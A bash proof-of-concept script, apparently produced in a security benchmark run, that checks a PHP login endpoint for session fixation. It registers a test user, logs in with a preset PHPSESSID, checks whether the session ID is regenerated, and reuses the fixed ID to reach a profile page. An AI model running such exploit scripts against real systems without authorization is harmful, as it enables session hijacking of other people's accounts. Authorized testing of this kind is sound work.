#!/bin/bash
# POC: Demonstrates session fixation vulnerability - lack of session regeneration on login endpoint. Creates a fixed session ID, authenticates with it, and verifies the server maintains the same session ID without regeneration.
# Target: ./repo
# Created: 2025-12-02T16:27:16.545Z
# Session: benchmark-XBEN-069-24-miorxjei

# Session Fixation POC - Demonstrates missing session_regenerate_id() on login
# This script shows how an attacker can fixate a session ID and use it to hijack a session

TARGET_URL="${1:-http://localhost}"
FIXED_SESSION_ID="313c25f4c09c66fc6529cf974b"

echo "[*] Session Fixation Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Create a test user account first
echo "[+] Step 1: Creating test user account..."
TEST_USER="sf_test_$(date +%s)"
TEST_PASS="TestPass123"
TEST_EMAIL="sf_${TEST_USER}@test.com"

REGISTER_RESPONSE=$(curl -s -X POST "$TARGET_URL/api/register.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$TEST_USER&password=$TEST_PASS&email=$TEST_EMAIL")

echo "[*] Registration response: $REGISTER_RESPONSE"
echo ""

# Step 2: Attempt login WITH pre-set PHPSESSID (session fixation attempt)
echo "[+] Step 2: Logging in with FIXED session ID: $FIXED_SESSION_ID"
echo "[*] Making login request with pre-set PHPSESSID cookie..."

LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/api/login.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: PHPSESSID=$FIXED_SESSION_ID" \
  -d "username=$TEST_USER&password=$TEST_PASS" 2>&1)

echo "$LOGIN_RESPONSE" > /tmp/login_response.txt
echo "[*] Full login response saved to /tmp/login_response.txt"
echo ""

# Step 3: Check if server issued a NEW Set-Cookie header
echo "[+] Step 3: Analyzing server response for session regeneration..."
SET_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie:" | grep -i "PHPSESSID")

VULNERABILITY_FOUND=0

if [ -z "$SET_COOKIE" ]; then
    echo "[!] VULNERABLE: No Set-Cookie header found in login response!"
    echo "[!] Server did NOT regenerate session ID on login"
    VULNERABILITY_FOUND=1
else
    NEW_SESSION_ID=$(echo "$SET_COOKIE" | grep -oP 'PHPSESSID=\K[^;]+' | head -1)
    if [ "$NEW_SESSION_ID" = "$FIXED_SESSION_ID" ]; then
        echo "[!] VULNERABLE: Server issued same session ID without regeneration!"
        VULNERABILITY_FOUND=1
    else
        echo "[*] Server regenerated session ID to: $NEW_SESSION_ID"
        VULNERABILITY_FOUND=0
    fi
fi
echo ""

# Step 4: Verify we can access authenticated resources with the fixed session ID
echo "[+] Step 4: Testing if fixed session ID allows access to protected resources..."
PROFILE_RESPONSE=$(curl -s -X GET "$TARGET_URL/profile.php" \
  -H "Cookie: PHPSESSID=$FIXED_SESSION_ID")

echo "[*] Profile response with fixed session ID:"
echo "$PROFILE_RESPONSE" | head -20
echo ""

# Check if we got valid profile data (indication of successful session hijacking)
if echo "$PROFILE_RESPONSE" | grep -q "username\|profile\|user"; then
    echo "[!] VULNERABLE: Fixed session ID provides access to authenticated resources!"
    echo "[!] Attacker can use the fixated session ID to impersonate the victim!"
fi
echo ""

# Step 5: Summary
echo "=========================================="
echo "VULNERABILITY ASSESSMENT SUMMARY"
echo "=========================================="
if [ $VULNERABILITY_FOUND -eq 1 ]; then
    echo "[CRITICAL] Session Fixation Vulnerability CONFIRMED"
    echo "- Server does not regenerate session ID on login"
    echo "- Attacker-supplied session ID is maintained"
    echo "- Pre-set session IDs can be used for account hijacking"
    echo "[+] POC SUCCESSFUL: Vulnerability demonstrated"
    exit 0
else
    echo "[PASS] Session properly regenerated on login"
    echo "[-] POC FAILED: Session appears to be properly regenerated"
    exit 1
fi